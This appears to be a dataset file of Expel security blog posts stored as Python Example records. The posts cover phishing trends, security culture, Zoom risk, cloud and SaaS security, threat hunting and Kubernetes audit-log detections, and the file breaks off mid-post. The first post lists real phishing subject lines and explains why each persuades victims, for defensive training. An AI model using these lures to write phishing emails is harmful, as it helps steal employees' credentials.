Google Drive File Shared [Name] sent you some files File- #### [Business Name] Sales Project Files and Request for Quote Context : File is another generic business term used in work emails and notifications. Using this term helps these phishing emails blend in with legitimate emails  creating another challenge for security technology. Again, people are inclined to respond in a timely manner to communications from co-workers, vendors or clients. Request Real subject lines: [Business Name] SALES PROJECT FILES AND REQUEST FOR QUOTE [Business Name]  W-9 Form Request Your Service Request #### Request Notification: #### Context : Requests are sufficiently general for mass phishing campaigns, while insinuating the recipient needs to take action. Some examples include prompting the user to access a link, download a file or provide sensitive personal information. Action Real subject lines: Action Required: Expiration Notice on [business email address] Action Required: [Date] Action Required: Review Message sent on [Date] [Action Required] Password Expire Context : Promoting action and a sense of urgency increases the chances that a recipient will act immediately after reading the message without taking much time to think, rather than leaving the email for later and potentially forgetting to respond. Document Real subject lines: File Document #### [Name], You have received a new document in [Company system] Attn: [Name]  You have an important [Business name] designated Document Document For [business email address] View Attached Documents [Name] shared a document with you Context : Like file, document is regularly used in subject lines and notifications, again helping the attacker target the most recipients and blend in with legitimate emails, challenging security technology. Once again, sharing a file prompts employees to respond in a timely manner to avoid missing work-related information. Verification Real subject lines: Verification Required! Context : Verification insinuates the recipient needs to take action, likely in a timely manner. Again, the user may be prompted to access a link, download a file or provide sensitive personal information. eFax Real subject lines: eFax from ID: #### eFax message from [phone number]  2 page(s), Caller-ID: +[phone number] Context : eFaxes are still used broadly as part of normal business operations for many orgs, so users may be tempted to click the link or download the file. VM Real subject lines: VM from [phone number] to Ext. ### on Tuesday, May 4, 2021 VM From ****#### Received  for &lt;[user name]&gt; July 26, 2021 1 VMAIL RECEIVED on Monday, June 21, 2021 3:02:55 PM Context : Most people using a work account want to make sure theyre promptly responding to communications from co-workers, vendors or clients, and are inclined to read or listen to new messages quickly. What to do next Successful credential harvesting through phishing can lead to an array of problems for a business. Luckily, there are a lot of things you can do to try to stop bad actors in their tracks. Number one  enable multi-factor authentication (MFA) for everything you can. Specifically with phish resistant MFA (FIDO/WebAuth). Even if a bad actor manages to harvest credentials through phishing, MFA can keep them from accessing your systems and data  and give you a heads up that someones trying to break in. Another important thing orgs can do to prevent successful phishing campaigns is to develop comprehensive phishing education programs. Orgs should stay up-to-date on the latest phishing trends to update their policies and educate employees when new tactics are at play. Beyond training sessions, regularly test employees with mock phishing emails (and provide feedback on what in the email was suspicious) so they continue to learn, hone their detection skills and know how to report suspicious emails in their inbox. Encourage employees to take a closer look at emails using the above keywords to make sure they recognize the sender, that the senders email looks legitimate (for example, does that voicemail notification match the official voicemail email for your org?) and that they are expecting the content of the email. If not, its always better to double check with the supposed sender through another form of communication (we love Slack!) before clicking on any unexpected files. When it comes to phishing, complacency is a risk. And weve seen that employees from orgs with strong phishing education programs are better at identifying actual malicious emails. Beyond MFA and education, there are additional things you can do to make your email system more secure in case an attacker manages to harvest credentials from an employee. Here are some of our top resilience recommendations: Disable legacy protocols like IMAP and POP3. Implement extra layers of conditional access for your riskier user base and high-risk applications. For O365 users, consider Azure AD Identity Protection or Microsoft Cloud App Security (MCAS). Want to find out how we stop BEC here at Expel? Check out Expel for Email .'}) (input_keys={'title'}),
  Example({'title': 'The Zen of cybersecurity culture', 'url': 'https://expel.com/blog/the-zen-of-cybersecurity-culture/', 'date': 'Nov 4, 2022', 'contents': 'Subscribe  EXPEL BLOG The Zen of cybersecurity culture Tips  5 MIN READ  YANEK KORFF  NOV 4, 2022 If we live a life of unawareness, we may get caught in the never-ending cycle of reacting to lifes circumstances  Mingyur Rinpoche Cybersecurity Awareness Month just wrapped. This years campaign themeSee Yourself in Cyberdemonstrates that while cybersecurity may seem like a complex subject, ultimately, its really all about people. This October will focus on the people part of cybersecurity, providing information and resources to help educate CISA partners and the public, and ensure all individuals and organizations make smart decisions whether on the job, at home or at schoolnow and in the future. ( Cybersecurity and Infrastructure Security Agency ) This years emphasis on people was refreshing. CAM always results in lots of blog posts and media articles sharing advice that people should follow, and this content is typically packed with outstanding information. At some point, though, our success in combating cybercrime needs to evolve past the advice stage and move into the culture stage. Instead of the bullet points being something we think about doing, they must become things we do all the time, without having to think . Lets turn this into year-round culture. Theres no question that designating a whole month to cybersecurity best practices is important. But cybersecurity awareness should be part of our day-to-day lives . Relying solely on following step-by-step advice for disaster prevention only in the month of October has the potential to stunt our progress toward a world built on ingrained safety and well-being. Is there a better, more positive way of thinking about this? The Zen distinction between thought and awareness provides some insight into where we are and where we want to go. Awareness itself allows us to stand at the rivers edge without getting sucked into the current Thoughts are still there. They may be quiet or turbulent, focused or wild and scattered. But we have stopped identifying with them. We have become the awareness, not the thoughts. We can think about our awareness and we can be aware of our thoughts , and a fully realized cybersecurity culture is grounded in the higher-order state. Consider driving a car. Safe driver checklists like this one which includes 33 stepslay out all the rules, most of which we learned while studying for our drivers licenses. But when we get behind the wheel, we dont pause to tick off each bullet. Most of us automatically buckle up. We check our mirrors before backing out of the driveway. We signal when we want to turn. We obey traffic signals and signs without thinking about it. We dont drag race through school zones. We turn on our lights at dusk and slow down when it snows. And most importantly, we pay attention to the traffic around us, because we know that awareness is our best defense.* In other words, were part of a culture of highway safety. We had it modeled for us by adults as we were growing up. We learned it in drivers ed and passed the tests when we turned 16. Through practice and repetition, we behave safely without thinking about it. We have become the checklist. This is where we need to get with cybersecurity. But how? Some thoughts. Training . It goes without saying (but well say it anyway) that training is essential. As we think about evolving toward a zen cybersecurity culture, here are a few things to consider. Training should be continuous . It isnt enough to have an annual or even semi-annual event. A program that schedules more routine engagement with security keeps good practices front-of-mind and introduces information about new threats. Training must be engaging . How often have you taken training where you hit play, went to do something else, then came back to take the test? This is, by definition, not trainingyou dont learn anything new or novel. Also, is the training basically a glorified PowerPoint? Modern audiences are accustomed to entertaining narratives driven by strong visual communication (and new information is interesting). These experiences establish a sensory baseline, and you cant learn when youre asleep. There are many ways to be boring, and all of them make for weak training. Training should be success-focused . Disaster cases are easy to find and make for compelling stories. But training that models winning provides the carrot to balance the stick of the daily news. No shame, no fear, no threatsthese arent dynamics you want at the center of your culture. Cases that illustrate how awareness and behavior won the day can associate strong security practices with satisfaction and accomplishment. Leadership suppor t. Employees are on the receiving end of lots of compulsory communications, and while they know these periodic reminders (legal, compliance, security, etc.) are important, they can quickly tune out as soon as they realize that, oh yeah, we already know this. A good way to bypass the tune-out is to make sure executives address security as a matter of habit outside routine channels. Leaders can use personal communications, company calls, unscheduled emails to reinforce training themes, point to internal successes, praise specific employees for best practice behavior, and the list goes on. The point is to illustrate that leaders arent just spouting boilerplate for legal CYA reasons. Culture ownership . One popular bit of advice is to assign the job of culture owner to a specific person. This is a good idea, especially in an institutional setting, because it elevates the profile of the evangelist and invests this person with the approval of leadership. Its only an interim step, though. Longer term, and beyond the walls of a single organization, everyone owns the culture. Socializing this message should be the culture owners primary mission. Core value. Organizations have a set of fundamental principles that guide everything they do. Customer focus is the prime directive for many businesses. Amazon is famous for its bias for action. Patagonia pledges to use business to protect nature. At Expel, we take equity, inclusion, and diversity very seriously because we know its the foundation for excelling at everything we do. Cybersecurity awareness not only safeguards the business, it promotes continuity and extends a halo of security to your customers, third parties, and communities. It can be an ideal pillar for a more productive value set. Normalize security discussions . Encourage employees to talk about security. Security awareness is routine in a mature cybersecurity culture. Over time, the goal is to replace FUD with a more casual enlightened paranoia. Yes, the bad guys are out to get usbecause thats what bad guys dobut we have it under control and we arent afraid. (Also, as the topic becomes normalized in the workplace, workers are more likely to take it home with them, helping spread awareness beyond the office.) Cybersecurity safeguards us from a volatile world of risk. But FUD and anxiety arent sustainable responses . In her recap of this years RSA Conference, Expel CMO Kelly Fiedler explained that hope and encouragement [wins] over fear, uncertainty, and doubt. In an industry that often relies on FUDto compel action, the common thread from the keynote speakers was a message of hope. Notable leaders from industry giants (think: RSA, Cisco, and VMware) took to the stage to remind us that if we pull together, we have the power to change the world for the better . As we close out Cybersecurity Awareness Month 2022, lets sustain the momentum by remembering to see ourselves in cyber . This prescription may seem a little abstract to some, but the emphasis on people thats easy to identify with. People are our coworkers, our families, our friends, and our neighbors. The more our culture is driven by awareness instead of checklists, the more energy we have for pursuits that benefit our organizations and the communities we serve and live in. * Yeah, we know. Not everybody is great about all these things. Especially the one about turn signals.'}) (input_keys={'title'}),
  Example({'title': 'Thinking about Zoom and risk', 'url': 'https://expel.com/blog/thinking-about-zoom-risk/', 'date': 'Apr 21, 2020', 'contents': 'Subscribe  EXPEL BLOG Thinking about Zoom and risk Security operations  4 MIN READ  BRUCE POTTER  APR 21, 2020  TAGS: CISO / Company news / Get technical / Heads up / Managed security Like you, weve been paying attention to the news about Zoom. In particular, were looking into various security findings and concerns shared on social media and in news outlets. The situation changes by the day, but I want to give you a quick overview of our opinion on all the various security findings and our thoughts on managing risk from using Zoom. First, the TL;DR. We are continuing to use Zoom. Weve looked at the product, how we use it, the company, and the overall risk to Expel, and were comfortable continuing to use it as part of our daily operations. How did we reach this conclusion? Read on. Dealing with third-party risk Stepping back from Zoom for a minute, when it comes to ANY external vendor, youre constantly balancing the reward of the service they offer with the risk of using that service. All of us (hopefully!) have a third-party risk program to document and guide the third-party risk management process. Not that long ago, managing third-party risk involved taking deep dives on individual products and asking: is this product suitable for use? But in a cloud native environment, the assessment has shifted. In a SaaS solution, a company can deploy updates to services without any notification that can dramatically change the product. Its nearly impossible to do a point in time assessment of their product and have it mean anything. Instead, we are now asking ourselves: is this company suitable for us to do business with? Lets look at Zoom and the companys actions to date. Zoom created a remote collaboration product with a relatively low learning curve, a common user experience across multiple platforms, and ran it in a reliable way. In 2020, theyve scaled from an average of 10 million meetings a day in January to 200 million meetings a day in March. Theyve moved many of their engineering resources over to focus on security and privacy issues. Zoom released numerous security updates to both fix vulnerabilities and add new security features. The CEO has been interviewed several times being incredibly frank about their security challenges and indicates security is going to be a big part of Zoom going forward. Zoom also recruited skilled security professionals such as Katie Moussouris (and her company Luta Security) and Alex Stamos to make sure the right things are being done both internally and externally. All in all, Zoom is making all the right decisions and doing the right things to address security concerns and build a more secure product. Theyre not burying their heads in the sand and theyre being very transparent. From a third-party risk perspective, Zoom is a company we want to do business with. What about the product? The product clearly still matters. So, lets take a look at the types of problems that were recently uncovered. Zoombombing. This is when uninvited people join Zoom meetings and cause disruption. Its a real problem right now. However, it appears to only occur during meetings with publicly accessible meeting IDs. This problem isnt limited to Zoom, unfortunately. The current spike in video conferencing leads to a spike in disruption as well. On April 15th, Fairfax County in Virginia had to cancel school for three days to develop countermeasures against students and other parties being disruptive using techniques such as racist and homophomic names and memes during distance learning classes. Theres anecdotal evidence of some non-public meetings being Zoombombed but not enough to convince us that its a real risk. Zoom quickly implemented countermeasures to dramatically slow the ability to find valid meeting IDs with brute force. Zoom also provided guidance to help run meetings more securely as well as grouped all the security controls under a big security button that hosts can use to quickly configure security options and maintain control of meetings. It seems that while Zoom cant control human nature, theyve put some controls at our fingertips to keep out those who want to disrupt or cause chaos in our meetings. Overall security of the Zoom app. Zoom can run in two ways: inside your browser or as a standalone application. The Zoom application has been getting a lot of attention lately and there have been several low risk vulnerabilities discovered including the ability to send malicious links in chat and to potentially be able to read Windows password hashes remotely. Also, security expert mudge had some choice words on the overall security of the Zoom binaries. In a nutshell, while the findings mudge talks about arent security vulnerabilities on their face, they are indicative of a development process that doesnt have security baked into it. Zoom quickly addressed these issues but theres likely to be more discoveries in the coming weeks. Looking at Zoom the company, they appear to be taking these concerns to heart and are working to build more secure applications as time goes on. All the attention from both security researchers and malicious users alike will continue to press Zoom to make their core application more secure. Encryption. While Zoom indicated sessions were end-to-end encrypted, the actual architecture is end-to-Zoom and Zoom-to-end encrypted. While its not ideal from a privacy perspective, Zoom meetings are encrypted on the wire. However, according to a Citizen Lab report even the encryption thats in place is home-rolled and generally not up to industry standards. While youre forced to trust Zoom to not intercept and do something malicious with your data, in general the real risk to this kind of communication is interception on the wire. And even if you capture data on the wire, you still have to do work to decrypt it. While weak encryption is never a good thing, in this case attackers have to be a) on the wire and b) motivated enough to perform the cryptanalysis to recover the cleartext data. These types of attackers are few and far between and generally tend to be interested in national security interests, not a meeting of your marketing department. Like everything else listed here, Zooms working to address this encryption issue. In a webinar on April 15th, Zoom indicated theyll be migrating to AES 256 GCM (instead of ECB) in a  matter of weeks  and are working towards full end-to-end encryption. Again, do you trust Zoom on this? Given their transparency to date, we believe that this is really the goal theyre working towards. If they focus the current discussions on end-to-end encryption and law enforcement access, theyll get to where theyre trying to go. So what? Every day that passes is a day that Zoom is a little more secure than it was the day before. Given the current encryption concerns, it makes sense that certain government agencies have said no to Zoom use. But for most corporate applications (and certainly your family and community activities), we believe Zoom is suitable for use. Barring any major changes in Zooms security posture, Expel will continue to use Zoom for our business needs. Have any other concerns about using Zoom? Let us know and well do our best to answer your questions.'}) (input_keys={'title'}),
  Example({'title': 'This is how you should be thinking about cloud security', 'url': 'https://expel.com/blog/how-you-should-think-cloud-security/', 'date': 'Jun 20, 2019', 'contents': 'Subscribe  EXPEL BLOG This is how you should be thinking about cloud security Security operations  5 MIN READ  MATT PETERS AND PETER SILBERMAN  JUN 20, 2019  TAGS: CISO / Cloud security / How to / Managed security / Planning You cant set foot in any conference or read an article in your go-to tech trade without hearing about cloud. And we totally get the fandom. The cloud offers businesses of all shapes and sizes plenty of benefits, with the biggest one being that you can move faster to accomplish a business outcome. Cloud is the perfect example of a technology where you can pour money into it to achieve scale. But how exactly do you do security in the cloud? Your IT team isnt racking and stacking servers like they used to  and its much harder to see the endpoints youre now responsible for protecting. But please let us be the bearers of some good news: securing your data in the cloud is much easier to do than you think, as long as youre thinking about the cloud in the right way. The security challenges of cloud With the cloud comes some fundamental shifts in how companies do business and how IT and security think about tech. Here are the ones you need to care about, because they impact how you need to protect your orgs data. Things move (a lot) faster. Sure, being able to go from nothing to a fully stood-up application in minutes is awesome, but it also puts a new burden on the security team (or your security person if you dont have a full team). Specifically, traditional change control processes are easily outgunned, which means you dont have those as an easy way to get visibility into the changes your developers are making since they may no longer need permissions to spin up new databases. You still have visibility in the cloud, but that view is different than what youre used to. The types of visibility available in the cloud are not always the same  understanding what telemetry data is available from your cloud provider will help you find commensurate controls. For example, it may not be easy to get full Packet Capture (PCAP) but you can get flow logs from most cloud providers. Youll probably have a new/different pivot point. When you think about infrastructure, you usually pivot based on hostname, IP and sometimes the user. But in looking at detection and response for cloud applications like Office 365 and G-Suite the logs usually only contain a username. In these cases, the user identity becomes the new thread to follow. (Speaking of Office 365, weve got an entire post right here about how to keep Office 365 secure. ) Our simplified 3-part take on cloud security We think about cloud in three distinct parts. Each part corresponds to a pattern we see that implies certain business goals, and brings with it specific complexities and advantages. By understanding which cloud youre talking about, youll have a much better handle on what controls youll be able to use effectively to protect your data. Part 1: Infrastructure Then  In the old world, your infrastructure was contained in a data center. There were physical walls around it with man-traps and guards. The network was similarly segmented, with (usually) well-understood ingress and egress points. Only a few people had permissions to make changes to the physical or logical infrastructure. As a result, concentrating visibility and control in a change control board (CCB) that met infrequently and authorized changes was pretty easy (and effective). Now  In the new world your data center is, at best, a logical construction. Physical walls are replaced with VPC configuration and your cohort of sys admins with root passwords are now replaced by API access and keys. Given that a team can spin up an entirely new infrastructure overnight with no real controls, it might seem like all hope to regain control and have oversight is lost. But its not. With the new world of configuration-driven infrastructure, youve got an opportunity to implement a new change control process. Your new process can rely on  gasp  automation to review configuration changes against your orgs best practices, conduct vulnerability scanning for new software and enforce security policies before changes are made. Now instead of periodically reviewing a spreadsheet to make sure your controls are still applicable and useful, you can now build controls right into your CI/CD pipeline. This visual from The New Stack is a great representation of how youre able to build these controls right into a product or service in the development process: Image source Part 2: Cloud apps Then  Back in the day you delivered software services the old-fashioned way  you ran those things yourselves! You had a cluster of Microsoft Exchange servers and an Oracle database running your CRM. You had on-call rotations and people who knew the way to the datacenter. Oh, and remember those Friday nights near the end of a quarter when you were frantically swapping out hard drives to get database clusters back online? Also, Limp Bizkit was a thing. Back then, you had all the control in the world to monitor whatever and however you wanted. But the costs were high. You were buying drives, constantly training people, triaging networking failures, dealing with power outages  all that stuff was your problem. You were optimizing for the cost of running and maintaining critical software with specific controls  and those controls were really the people who could upgrade and access running servers. You probably also had controls that required employees to physically be in an office to get work done (yeah, Im talkin about pre-VPN days). Now  Enter SaaS applications . And lots of them. Today, emails delivered via Office 365 or G-Suite through servers youll never see. Theres no physical boundary you can monitor or control, no server to instrument. Youve gotta rely on built-in application and audit logs to monitor these applications. The good news is that (for the most part) these applications come with excellent application logging built right into them. For example, SalesForce has extensive audit logging built in as a button-click. On top of that, advances in data science have taken user-based anomaly detection from something you read about in academic papers to something thats now built right into many platforms in SIEM products like Exabeam and Sumo Logic. Sure, theres a little bit of a learning curve here  youll have to spend some time understanding these new application logs and how to instrument them to monitor for unusual or malicious activity. Even though this new world requires some learning up front, theres more value for you and your org in the long run, because youre able to spend time focusing on the security of the application, not on keeping the lights on. Want more specific recommendations on how to get started with protecting your cloud apps? Then you need to read this post:  Three tips for getting started with cloud application security.  Part 3: Custom apps Then  In the past, rolling out new apps was a long and painful process  developers spent time testing, sys admins were deploying and then there were bumps in the road. Developers then had to patch in production (Its the last time well do this, I swear!) and then finally the system worked. Now  With the cloud, app development and deployment happens much faster  if developers and the operations team work together to build an environment with the right balance between controls, processes, velocity and automation, that is. Custom applications require that the security and operations team understand the application in order to secure it. If you dont have a topological control-point like a fixed network egress this can feel daunting, but the same configuration-as-code that makes your developers more effective also let your security team understand the application and monitor changes. The focus in modern DevOps on solid application logging is a good thing because it means that security signals are already built into your custom app when it gets deployed. And most modern deployment pipelines take advantage of configuration checking, image scanning and compliance checking  and theyre usually (easy) click-to-enable type features. As with infrastructure and SaaS, the promise of infrastructure-as-code and application logging requires a partnership with the development team, as well as some expertise in modern DevOps tool chains (were fans of several infrastructure-as-code tools such as Terraform and Ansible ). What now? The cloud has plenty of benefits  when it comes to security, we just need to re-evaluate the contents of our bag of tricks. Some tried-and-true methods from our rack and stack days are no longer relevant. But if you approach cloud security from the three vantage points described above, youll be well on your way to building a solid security foundation. Have more questions about cloud? Drop us a note . Wed love to chat.'}) (input_keys={'title'}),
  Example({'title': 'Threat hunting: Build or buy?', 'url': 'https://expel.com/blog/threat-hunting-build-or-buy/', 'date': 'Jan 11, 2022', 'contents': 'Subscribe  EXPEL BLOG Threat hunting: Build or buy? Engineering  5 MIN READ  BRYAN GERALDO  JAN 11, 2022  TAGS: Cloud security / MDR / Tech tools Faced with ever-evolving threats in this cyber-fueled world, threat hunting is critically important. But your ability to apply a consistent level of analytic rigor and produce valuable findings while threat hunting relies heavily on your available tech and expertise. Plus, finding the time and space to effectively implement and participate in threat hunting can be difficult. So, whats the best option  build your own hunting program or buy a hunting service? In my previous blog post , I explained what hunting is and why its important for security practitioners to understand the value it provides to detection and response. In this blog post, Im going to cover what to consider as you add hunting to your orgs security program (like cost and security team capacity) and your options when you dont have the resources to build the threat hunting program yourself. A history lesson In the 1950s, my wifes grandfather  Bill McPhee  created the first computer-based predictive behavioral model to identify patterns of human behavior. According to author Jill Lepores 2020 book, If Then, this model may have played a role in helping elect John F. Kennedy Jr. (JFK) to the presidency. How? By identifying patterns of potential voter behavior. It all started with a hypothesis  can advanced data analysis of historical voting patterns be used to predict or influence election outcomes? To test the hypothesis, a smart group of people used specially designed technology to analyze historical voting data among different voter groups. These groups were assigned by a collection of shared characteristics (religious affiliation, income level, gender, geographic location, etc.). The analysis identified behavioral patterns within these voter groups that helped JFKs team tailor campaign messaging for those specific audiences. And those audiences ultimately played a major role in his narrow victory. The use of advanced data analysis to confirm or disprove a hypothesis is still as prevalent today as it was then. For example, its a key component of threat hunting. A strong hunting program requires 1) an understanding of known attack behaviors 2) awareness of your attack surface (so what is at risk) to inform hypotheses for good hunts; and 3) the right data and expertise to not only ensure that you can remove the signal from the noise, but that you can create good, repeatable paths for analysis. And that analysis with hunting is far more advanced using a combination of code and humans to conduct cross-correlation and frequency analysis to help extend the monitoring of an infrastructure beyond the one-sided view you can expect with detections. You need to maintain your hunting program if you want it to succeed. A good hunting program includes tools and processes that ensure analytic rigor (e.g. repeatable analysis and results), a sound feedback loop for hunts, and a team that stays up-to-date on the latest research and how best to use your security tools. All of this requires human resources, time, and a strategy that allows you to evolve your program as needed. Build? Cost of building a hunting program The hurdle that many orgs have to overcome is whether to buy or build a threat hunting program. And if building, can the program be effectively implemented and managed on an ongoing basis? Lets take a look at a few cost estimates associated with building a security operations centers (SOCs), closely aligned with similar figures outlined by Ponemon Institute in 2021. SOC-related costs are good indicators of hunting costs because many hunting programs rely on the same tech and staff as the orgs SOC. Typical SOC cost averages: Annual salary for a security analyst: ~ $115,000. Intended annual spend for tools: ~$180,000  SIEM ~$340,000  Security Orchestration Automation Response (SOAR) ~330,000  Extended detection &amp; response (XDR) Spending on security engineering to make it all work. Cost: ~ $2.5 Million per year Also, looking at recent data from a SANS study, we see that most orgs dont have full-time hunting staff. Just 19 percent of respondents were working as full-time threat hunters at their organizationsand 75 percent of orgs were hunting using staff that also fulfill other roles within the organization. To keep things simple, lets exclude the budget for security engineering. Well also assume all of the relevant people and tech are working on threat hunting 25 percent of the time. Check out the total amount in the chart above. Excluding the cost for security engineering, the average cost of a hunting program (at 25 percent of the annual SOC spend) could easily meet or exceed $200,000. This breaks down to approximately $16,000 per month for a hunting program that may not be fully used. Then you need to take into account that those hunting efforts are likely limited to a particular tech platform  like your endpoint detection and response (EDR) tool and infrastructure like Windows Active Directory (AD). Those hunting efforts would have limited visibility across the whole environment. Does that cost seem reasonable? To us, it only seems reasonable if, for example, youre able to identify something during every hunt that reduces the dwell time (time spent undetected in the environment) of an attacker. But finding an attacker is never a guarantee. Plus, hunting with limited visibility, experience, or time can yield sub-par results and findings. And since hunting isnt a full-time effort for many orgs, the struggle to implement, manage, and measure hunting continues. As a result, many orgs find themselves spending a lot of money to build a hunting program that doesnt provide useful results and is difficult to maintain. When they arent focusing on threat hunting, 75% of respondents are focusing on incident response or forensics. Just over half (51%) performed a security architecture/engineering role, and a little over a third (37%) performed system administration functions. Almost half (45%) of respondents run an ad hoc hunting process that is dependent on their needs. That makes it more difficult to have dedicated resources for threat hunting and leads to less consistent results. Also, most respondents measure the success of threat hunting on an ad hoc basis, making it even more difficult to get numbers that justify employing enough dedicated threat hunters. Because threat hunting requires the allocation of budget and resources, measuring the effect it has is important. In last years survey, we established that most organizations still struggle to measure threat hunting in a consistent way. To sum it up: a lot of orgs are making efforts to strengthen their security (at considerable cost) with investments that often include or align with threat hunting. Yet, these same orgs use staff for hunting whose primary responsibilities are tied to other groups (like SOC or Incident Response). Even with a larger focus on hunting, these orgs often have limited time available to dedicate to hunting and limited visibility into their infrastructure. Also, without a good process and tools to capture and track results, its hard to measure the impact of these hunting efforts over time. Buy? Value of buying a hunting service So, if your org knows threat hunting is important but doesnt have the time and resources to dedicate to effective hunting, whatre your options? Is it worth engaging an outside service to augment the efforts youre already making? Can a hunting partner give you extra coverage and peace of mind? To us, its a resounding yes. The best part? You also save money. According to Aite-Novarica Groups recent Threat Hunting Impact Report , Adding this service should be an easy decision for clients to make in light of the value provided. For less than the cost of bringing a single threat hunter on staff, organizations can benefit from a fully managed hunting service utilizing highly experienced hunters and an automated hunting platform. Hunting partners should also give you guidance on how to use hunting strategically and set up measurement frameworks. Here at Expel, weve identified ways to track the effectiveness of using our hunting service . For example, when an org implements short-term remediations or long-term operational tools and processes as the result of our hunt findings, we track the outcomes over time. Stay tuned for an upcoming blog discussing one of these tracking tools in more depth  our resilience recommendations. Ready to learn more? Watch my Fireside chat with ISMG : The evolution of threat hunting and why its more important now than ever.'}) (input_keys={'title'}),
  Example({'title': 'Three Kubernetes events worth investigating', 'url': 'https://expel.com/blog/three-kubernetes-events-worth-investigating/', 'date': 'Oct 24, 2022', 'contents': 'Subscribe  EXPEL BLOG Three Kubernetes events worth investigating Security operations  3 MIN READ  DAN WHALEN  OCT 24, 2022  TAGS: Cloud security Monitoring your Kubernetes environment is important  especially if youre running production workloads. Lets say youve already done the work of collecting the Kubernetes audit logs whats next? What should you actually be looking for? Here at Expel, weve been working on Kubernetes security monitoring for a while and have some insights to share. Whether you run Kubernetes yourself or use a managed provider like GKE, EKS, or AKS, certain events are worth investigating. They might indicate a mistake or, worst-case scenario, you might have an attacker poking around inside your Kubernetes cluster. Successful authorization of an anonymous request Okay, so nobody has Kubernetes clusters with public endpoints anymore, right?  Right? (Cue awkward silence) As it turns out, this is still really common. A recent internet scan by Shadowserver found nearly 400,000 publicly accessible Kubernetes API endpoints. Were not here to name-and-shame, but there are some real reasons you may want a public API endpoint. Its pretty convenient, for example. But that convenience comes with associated risk. Youll want to make sure that anonymous access is disabled (or well controlled) to avoid leaking sensitive information about your workloads (or worse, secrets that lead to a larger compromise). Luckily, this is something we can easily detect using the Kubernetes audit log. When API requests are logged, anonymous users are categorized under the system:anonymous group, letting you easily look for any requests that were allowed for that group. Watch for requests for unexpected resource kinds. Quick tip: Some managed providers have default built-in roles that grant anonymous users some very limited permissions (for cluster discovery). Examples include GKEs system:discovery and system:public-info-viewer roles . Anonymous requests for these default roles might be okay, depending on your risk model. Default service account bound to privileged cluster role Default service accounts are one of the most common ways to escalate privileges in Kubernetes. Unless you explicitly change this behavior, Kubernetes will create and auto-mount default service account credentials into pods as they are created. This isnt a huge issue if you arent using that default service account for anything, as they dont have any permissions by default. However, if you granted default service account permissions with a role binding, an attacker could use those permissions against you. For this reason, its a good idea to look out for the creation of a cluster role binding that maps a default service account to a privileged cluster role. This practice has the unintentional effect of granting cluster-wide permissions to all pods created in the service accounts namespace (except for pods that opt out of the credentials or choose a different service account). In any case, its a dangerous practice that usually leads to unnecessary exposure of credentials with API permissions. This is also easy to detect in the Kubernetes audit log. Simply look for the creation or modification of a role binding where the subjects include a default service account and the referenced role is privileged (like view, edit, admin, or cluster-admin). Quick tip: Service account subject names start with system:serviceaccount: and end with :default. Pod created with an unusual image Its a good idea to get a handle on the images running in your cluster. From what weve seen of the Kubernetes threat landscape so far, coin mining tends to be a common goal for opportunistic attackers. It isnt sophisticated, and its not a good look if youre affected. We recommend a deployment model where theres only one way to deploy images (usually a CI/CD service) rather than allowing users to create pods manually. If you implement this approach, and expect images to only come from your private image repository, its a great opportunity to discover pods that dont follow those rules. Even if you dont have your deployment process locked down to that degree, there are some images you probably never expect to see in your clusters and are worth examining. Quick tip: Pod images are logged in the format &lt;repository hostname&gt;/&lt;image name&gt;:&lt;tag&gt;. This makes it easy to look out for unexpected repositories or image names. Taking it to the next level The Kubernetes audit log is a great source of high-fidelity security signals. Weve walked through three ideas to get you started, but theres a whole world of opportunity to build out security alerting that helps you identify and quickly respond to issues before they become full-on crises. Expel aims to make Kubernetes security accessible to everyone. If youd like to learn more about how we can help, contact us .'}) (input_keys={'title'}),
  Example({'title': 'Three tips for getting started with cloud application security', 'url': 'https://expel.com/blog/three-tips-getting-started-cloud-application-security/', 'date': 'Jan 22, 2019', 'contents': 'Subscribe  EXPEL BLOG Three tips for getting started with cloud application security Security operations  3 MIN READ  JUSTIN BAJKO AND PETER SILBERMAN  JAN 22, 2019  TAGS: Cloud security / How to / Planning If youve been feeling like your SaaS security knowledge is a bit cloudy (heh!), then youve come to the right place. Last fall, we shared some initial thoughts on how to get a grip on your cloud security strategy. But we continue to hear more cloud-related questions from our customers, particularly when it comes to cloud application security. For example, these three come up week after week: Whos really responsible for protecting what? How do I actually get started? Where should I start? What types of things should I be looking for, and where? And how? Heres our two cents. First things first: Whos responsible for protecting what? This is the million-dollar question: When you move to the cloud, whos responsible for protecting what? When it comes to security, youve got to think about your cloud infrastructure (the systems and workloads youre running in AWS, Microsoft Azure or Google) and your cloud applications (Office 365, Salesforce, Workday, etc.) as two separate things because each of them comes with different types of security risks and requires different investigation techniques. (By the way, weve got an entire post filled with Office 365 security best practices for you, which is right here. ) And while, in the case of SaaS applications, the security of the infrastructure is the responsibility of your cloud service provider, the security of your data that lives in your cloud applications and the user accounts allowed to access those applications are your responsibility. Sure, youre probably using all of those convenient SaaS applications so you dont have to maintain the physical hardware and networks they run on, but its still your data, so its your responsibility to know whos accessing it and whether that access is authorized. #jobsecurity Monitoring SaaS applications is a different ballgame because youre not looking for malware on a laptop anymore. Devices are no longer your endpoints  your users are. Monitoring a SaaS environment is about understanding user behavior and that starts with understanding the signals your SaaS provider is sending you and verifying that theyre properly configured. What are the must-dos when it comes to protecting SaaS applications? We could answer this question with an entire scroll of to-dos (this is one of our favorite topics, ya know), but three seems like a manageable number. So, here are the three most important things you can do if youre just getting started with cloud application security. Identify all of your cloud applications. Sounds simple, but trust us  its not. There are probably at least a couple (dozen?) SaaS apps running in your environment that you dont know about. Time to take inventory. There are a bunch of ways to get started. For example, if youve got one of the firewalls or intrusion detection system (IDS) products that inspects traffic, it can give you a report of the cloud applications people are using in your environment. You can also use a cloud access security broker (CASB) to shine a light on the applications being used, and begin to enforce some policies about their use. Once youve got that list you can use it to audit the different contracts and services that each department has subscribed to within your org. Gather the log data from these applications. Once you gather the log data from each app, store it in a place where its easy to search, so you can write detections based on certain conditions. What should you be looking for, exactly? Watch for common signs of compromise, like logins coming from a VPN provider, a burst of document sharing activity or application-specific signs of misuse and compromise like an email rule thats created to forward emails to an inbox outside the corporate domain (just to name a few). Focus on the users. Say it with me: Users are the new endpoints. Here at Expel, our cloud application detections fall into about five classes of detections, all of which  you guessed it  examine user behavior. Each class has specific detections for a given application  like authentication, email management and resource management. What are some common detections that would require us to alert a customer and perform further investigation, you ask? One example is finding a user who is authenticating from a VPN service provider. This isnt necessarily a smoking gun, but its uncommon enough that wed want to look more deeply into that users activity to see if anything else theyre doing looks fishy. Another example is a user configuring an inbox rule that auto-forwards all their corporate email to a Yahoo account (or really any external email). Another anomaly we detect is when a user anonymously shares a lot of documents in a short period of time. We alert our customers about user behaviors that present potential risks to their data, and then partner with 